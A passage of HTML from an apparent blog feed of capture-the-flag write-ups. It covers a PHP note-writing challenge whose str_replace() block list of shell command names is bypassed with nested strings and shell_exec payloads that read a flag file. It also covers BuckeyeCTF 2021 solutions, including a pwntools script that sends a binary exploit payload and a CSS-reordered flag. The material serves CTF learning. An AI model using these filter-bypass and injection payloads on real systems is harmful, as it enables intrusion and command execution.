class="string">&quot;tail&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$notetoadd</span>);</span><br><span class="line">    <span class="variable">$notetoadd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;dd&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$notetoadd</span>);</span><br><span class="line">    <span class="variable">$notetoadd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;cut&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$notetoadd</span>);</span><br><span class="line">    <span class="variable">$notetoadd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;grep&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$notetoadd</span>);</span><br><span class="line">    <span class="variable">$notetoadd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;tac&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$notetoadd</span>);</span><br><span class="line">    <span class="variable">$notetoadd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;awk&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$notetoadd</span>);</span><br><span class="line">    <span class="variable">$notetoadd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;sed&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$notetoadd</span>);</span><br><span class="line">    <span class="variable">$notetoadd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;read&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$notetoadd</span>);</span><br><span class="line">    <span class="variable">$notetoadd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;system&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$notetoadd</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$notetoadd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;notewrite&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$newnote</span> = <span class="variable">$_POST</span>[<span class="string">&quot;notewrite&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//3rd times the charm and I&#x27;ve learned my lesson. Now I&#x27;ll make sure to filter more than once :)</span></span><br><span class="line">    <span class="variable">$notetoadd</span> = <span class="title function_ invoke__">filter</span>(<span class="variable">$newnote</span>);</span><br><span class="line">    <span class="variable">$notetoadd</span> = <span class="title function_ invoke__">filter</span>(<span class="variable">$notetoadd</span>);</span><br><span class="line">    <span class="variable">$notetoadd</span> = <span class="title function_ invoke__">filter</span>(<span class="variable">$notetoadd</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$filename</span> = <span class="title function_ invoke__">generateRandomString</span>();</span><br><span class="line">    <span class="title function_ invoke__">array_push</span>(<span class="variable">$_SESSION</span>[<span class="string">&quot;notes&quot;</span>], <span class="string">&quot;<span class="subst">$filename</span>.php&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;<span class="subst">$filename</span>.php&quot;</span>, <span class="variable">$notetoadd</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;location:index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>Challenge Entry<br><img src="https://i.imgur.com/7K9nO5Y.png"></p></li><li><p>Analysis &#x3D;&gt; find vulnerability at <code>str_replace()</code>:</p><ul><li>Although there exists filter to filter specifc command</li><li>We can easily bypass <code>str_replace()</code> by reconstructing the string one by one word thus leads to command injections  (e.g. if <code>cat</code> is filtered for once, the if we construct a word <code>c</code>cat<code>a</code>cat<code>t</code>cat, when cat is filtered, <code>cat</code> will remain and we can utilize this vulnerability to construct our payload)</li></ul></li><li><p>Payload:</p><ul><li><code>&lt;&lt;&lt;&lt;???? phpinfo(); ????&gt;&gt;&gt;&gt;</code></li><li>Result:<br>  <img src="https://i.imgur.com/Wf8JUSK.jpg"></li></ul></li><li><p>Payload:</p><ul><li><code>&lt;&lt;&lt;&lt;???? echo shell_exec(&#39;whoami&#39;); ????&gt;&gt;&gt;&gt;</code></li><li>Result:<br>  <img src="https://i.imgur.com/TMPaf5Y.jpg"></li></ul></li><li><p>Payload:</p><ul><li><code>&lt;&lt;&lt;&lt;???? echo shell_exec(&#39;ls -lart&#39;); ????&gt;&gt;&gt;&gt;</code></li><li>Result:<br>  <img src="https://i.imgur.com/S7TboLk.jpg"></li></ul></li><li><p>Payload:</p><ul><li><code>&lt;&lt;&lt;&lt;???? echo shell_exec(&#39;ccccatatatat /fffflaglaglaglag.php&#39;); ????&gt;&gt;&gt;&gt;</code></li><li>Result: flag: <code>flag&#123;wait_but_i_fixed_it_after_my_last_two_blunders_i_even_filtered_three_times_:(((&#125;</code><br>  <img src="https://i.imgur.com/NWY85w6.jpg"><h2 id="Resources-for-challenge-2"><a href="#Resources-for-challenge-2" class="headerlink" title="Resources for challenge 2"></a>Resources for challenge 2</h2><a href="https://www.php.net/manual/en/function.shell-exec.php">PHP execute commands</a><br><a href="https://github.com/m3ssap0/CTF-Writeups/blob/master/35C3%20Junior%20CTF/flags/README.md">str_replace() tricks</a><br><a href="https://jbz.team/turinctf2017/turinctf">str_replace() tricks 2</a></li></ul></li></ul><h1 id="Result"><a href="#Result" class="headerlink" title="Result"></a>Result</h1><ul><li>I solved two challeges, and all of us solved 9 challenges<br><img src="https://i.imgur.com/k7s83OX.png"></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BuckeyeCTF 2021</title>
      <link href="/2021/10/23/BuckeyeCTF-2021/"/>
      <url>/2021/10/23/BuckeyeCTF-2021/</url>
      
        <content type="html"><![CDATA[<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h3 id="replay"><a href="#replay" class="headerlink" title="replay"></a><code>replay</code></h3><ul><li>Wireshark<br>  <img src="https://i.imgur.com/s6KzrFl.jpg"><ul><li>resend the payload</li></ul></li></ul><p><a href="https://jeff14994.github.io/2021/10/23/BuckeyeCTF-2021/" target="_self">Read More →</a></p><span id="more"></span><ul><li>Script<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cat payload.txt | cut -d &quot; &quot; -f1 | cut -d &#x27;&quot;&#x27; -f2 | tr -d &quot;\n&quot; &gt; payload_processed.txt</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">c = remote(<span class="string">&#x27;misc.chall.pwnoh.io&#x27;</span>, <span class="number">13371</span>)</span><br><span class="line"><span class="built_in">print</span>(c.recv())</span><br><span class="line">c.send(<span class="string">b&quot;\x61\x61\x61\x61\x62\x61\x61\x61\x63\x61\x61\x61\x64\x61\x61\x61\x65\x61\x61\x61\x66\x61\x61\x61\x67\x61\x61\x61\x68\x61\x61\x61\x69\x61\x61\x61\x6a\x61\x61\x61\x6b\x61\x61\x61\x6c\x61\x61\x61\x6d\x61\x61\x61\x6e\x61\x61\x61\x6f\x61\x61\x61\x70\x61\x61\x61\x71\x61\x61\x61\x72\x61\x61\x61\x73\x61\x61\x61\x74\x61\x61\x61\x75\x61\x61\x61\x76\x61\x61\x61\x77\x61\x61\x61\x78\x61\x61\x61\x79\x61\x61\x61\x7a\x61\x61\x62\x62\x61\x61\x62\x63\x61\x61\x62\x64\x61\x61\x62\x65\x61\x61\x62\x66\x61\x61\x62\x67\x61\x61\x62\x68\x61\x61\x62\x69\x61\x61\x62\x55\x11\x40\x00\x00\x00\x00\x00\x0f\x00\x00\x00\x00\x00\x00\x00\x57\x11\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x20\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x3b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x57\x11\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x33\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0a&quot;</span>)</span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure></li><li>Result: <code>buckeye&#123;g00d_th1ng_P1E_w4s_d1s4bl3d_0n_th3_b1n4ry&#125;</code><br>  <img src="https://i.imgur.com/w14tqZz.png"><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="pay2win"><a href="#pay2win" class="headerlink" title="pay2win"></a>pay2win</h2></li><li>It obsucated the flag’s order</li><li>js source code<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">plantFlag</span> () &#123;</span><br><span class="line"><span class="keyword">const</span> ciphertext = [<span class="number">234</span>, <span class="number">240</span>, <span class="number">234</span>, <span class="number">252</span>, <span class="number">214</span>, <span class="number">236</span>, <span class="number">140</span>, <span class="number">247</span>, <span class="number">173</span>, <span class="number">191</span>, <span class="number">158</span>, <span class="number">132</span>, <span class="number">56</span>, <span class="number">4</span>, <span class="number">32</span>, <span class="number">73</span>, <span class="number">235</span>, <span class="number">193</span>, <span class="number">233</span>, <span class="number">152</span>, <span class="number">125</span>, <span class="number">19</span>, <span class="number">19</span>, <span class="number">237</span>, <span class="number">186</span>, <span class="number">131</span>, <span class="number">98</span>, <span class="number">52</span>, <span class="number">186</span>, <span class="number">143</span>, <span class="number">127</span>, <span class="number">43</span>, <span class="number">226</span>, <span class="number">233</span>, <span class="number">126</span>, <span class="number">15</span>, <span class="number">225</span>, <span class="number">171</span>, <span class="number">85</span>, <span class="number">55</span>, <span class="number">173</span>, <span class="number">123</span>, <span class="number">21</span>, <span class="number">147</span>, <span class="number">97</span>, <span class="number">21</span>, <span class="number">237</span>, <span class="number">11</span>, <span class="number">254</span>, <span class="number">129</span>, <span class="number">2</span>, <span class="number">131</span>, <span class="number">101</span>, <span class="number">63</span>, <span class="number">149</span>, <span class="number">61</span>]</span><br><span class="line"><span class="keyword">const</span> plaintext = ciphertext.<span class="title function_">map</span>(<span class="function">(<span class="params">x, i</span>) =&gt;</span> ((i * i) % <span class="number">256</span>) ^ x ^ <span class="number">0x99</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> flagElement = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#flag&#x27;</span>)</span><br><span class="line">plaintext.<span class="title function_">map</span>(<span class="function">(<span class="params">x, i</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> span = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;span&#x27;</span>)</span><br><span class="line">  span.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">`flag-char-<span class="subst">$&#123;i&#125;</span>`</span>)</span><br><span class="line">  span.<span class="property">textContent</span> = <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(x)</span><br><span class="line">  flagElement.<span class="title function_">appendChild</span>(span)</span><br><span class="line">  <span class="keyword">return</span> span</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">plantFlag</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li>css source code<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#flag-overlay</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">z-index</span>: <span class="number">5</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#b5b5b5</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.flag-char-0</span> &#123;</span><br><span class="line">    <span class="attribute">order</span>: <span class="number">13</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.flag-char-1</span> &#123;</span><br><span class="line">    <span class="attribute">order</span>: <span class="number">47</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.flag-char-2</span> &#123;</span><br><span class="line">    <span class="attribute">order</span>: <span class="number">40</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.flag-char-3</span> &#123;</span><br><span class="line">    <span class="attribute">order</span>: <span class="number">49</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.flag-char-4</span> &#123;</span><br><span class="line">    <span class="attribute">order</span>: <span class="number">39</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.flag-char-5</span> &#123;</span><br><span class="line">    <span class="attribute">order</span>: <span class="number">50</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.flag-char-6</span> &#123;</span><br><span class="line">    <span class="attribute">order</span>: <span class="number">15</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.flag-char-7</span> &#123;</span><br><span class="line">    <span class="attribute">order</span>: <span class="number">26</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.flag-char-8</span> &#123;</span><br><span class="line">    <span class="attribute">order</span>: <span class="number">35</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.flag-char-9</span> &#123;</span><br><span class="line">    <span class="attribute">order</span>: <span class="number">18</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.flag-char-10</span> &#123;</span><br><span class="line">    <span class="attribute">order</span>: <span class="number">29</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.flag-char-11</span> &#123;</span><br><span class="line">    <span class="attribute">order</span>: <span class="number">44</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.flag-char-12</span> &#123;</span><br><span class="line">    <span class="attribute">order</span>: <span class="number">42</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.flag-char-13</span> &#123;</span><br><span class="line">    <span class="attribute">order</span>: <span class="number">20</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.flag-char-14</span> &#123;</span><br><span class="line">    <span class="attribute">order</span>: <span class="number">55</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.flag-char-15</span> &#123;</span><br><span class="line">    <span class="attribute">order</span>: <span class="number">32</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.flag-char-16</span> &#123;</span><br><span class="line">    <span class="attribute">order</span>: <span class="number">43</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.flag-char-17</span> &#123;</span><br><span class="line">    <span class="attribute">order</span>: <span class="number">11</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.flag-char-18</span> &#123;</span><br><span class="line">    <span class="attribute">order</span>: <span class="number">48</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.flag-char-19</span> &#123;</span><br><span class="line">    <span class="attribute">order</span>: <span class="number">14</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.flag-char-20</span> &#123;</span><br><span class="line">    <span class="attribute">order</span>: <span class="number">16</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.flag-char-21</span> &#123;</span><br><span class="line">    <span class="attribute">order</span>: <span class="number">25</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.flag-char-22</span> &#123;</span><br><span class="line">    <span class="attribute">order</span>: <span class="number">52</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.flag-char-23</span> &#123;</span><br><span class="line">    <span class="attribute">order</span>: <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.flag-char-24</span> &#123;</span><br><span class="line">    <span class="attribute">order</span>: <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.flag-char-25</span> &#123;</span><br><span class="line">    <span class="attribute">order</span>: <span class="number">30</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.flag-char-26</span> &#123;</span><br><span class="line">    <span class="attribute">order</span>: <span class="number">17</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.flag-char-27</span> &#123;</span><br><span class="line">    <span class="attribute">order</span>: <span class="number">21</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.flag-char-28</span> &#123;</span><br><span class="line">    <span class="attribute">order</span>: <span class="number">54</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.flag-char-29</span> &#123;</span><br><span class="line">    <span class="attribute">order</span>: <span class="number">22</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.flag-char-30</span> &#123;</span><br><span class="line">    <span class="attribute">order</span>: <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.flag-char-31</span> &#123;</span><br><span class="line">    <span class="attribute">order</span>: <span class="number">38</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.flag-char-32</span> &#123;</span><br><span class="line">    <span class="attribute">order</span>: <span class="number">7</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.flag-char-33</span> &#123;</span><br><span class="line">    <span class="attribute">order</span>: <span class="number">37</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.flag-char-34</span> &#123;</span><br><span class="line">    <span class="attribute">order</span>: <span class="number">46</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.flag-char-35</span> &#123;</span><br><span class="line">    <span class="attribute">order</span>: <span class="number">45</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.flag-char-36</span> &#123;</span><br><span class="line">    <span class="attribute">order</span>: <span class="number">24</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.flag-char-37</span> &#123;</span><br><span class="line">    <span class="attribute">order</span>: <span class="number">3</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.flag-char-38</span> &#123;</span><br><span class="line">    <span class="attribute">order</span>: <span class="number">19</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.flag-char-39</span> &#123;</span><br><span class="line">    <span class="attribute">order</span>: <span class="number">31</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.flag-char-40</span> &#123;</span><br><span class="line">    <span class="attribute">order</span>: <span class="number">23</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.flag-char-41</span> &#123;</span><br><span class="line">    <span class="attribute">order</span>: <span class="number">33</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.flag-char-42</span> &#123;</span><br><span class="line">    <span class="attribute">order</span>: <span class="number">8</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.flag-char-43</span> &#123;</span><br><span class="line">    <span class="attribute">order</span>: <span class="number">41</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.flag-char-44</span> &#123;</span><br><span class="line">    <span class="attribute">order</span>: <span class="number">27</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.flag-char-45</span> &#123;</span><br><span class="line">    <span class="attribute">order</span>: <span class="number">6</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.flag-char-46</span> &#123;</span><br><span class="line">    <span class="attribute">order</span>: <span class="number">9</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.flag-char-47</span> &#123;</span><br><span class="line">    <span class="attribute">order</span>: <span class="number">28</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.flag-char-48</span> &#123;</span><br><span class="line">    <span class="attribute">order</span>: <span class="number">53</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.flag-char-49</span> &#123;</span><br><span class="line">    <span class="attribute">order</span>: <span class="number">5</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.flag-char-50</span> &#123;</span><br><span class="line">    <span class="attribute">order</span>: <span class="number">34</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.flag-char-51</span> &#123;</span><br><span class="line">    <span class="attribute">order</span>: <span class="number">51</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.flag-char-52</span> &#123;</span><br><span class="line">    <span class="attribute">order</span>: <span class="number">10</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.flag-char-53</span> &#123;</span><br><span class="line">    <span class="attribute">order</span>: <span class="number">12</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.flag-char-54</span> &#123;</span><br><span class="line">    <span class="attribute">order</span>: <span class="number">36</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.flag-char-55</span> &#123;</span><br><span class="line">    <span class="attribute">order</span>: <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution:"></a>Solution:</h3></li><li>Reconstruct the flag with the order at <code>css</code><ul><li>Obsucated flag:<blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0        10        20        30        40        50</span><br><span class="line">12345678901234567890123456789012345678901234567890123456</span><br><span 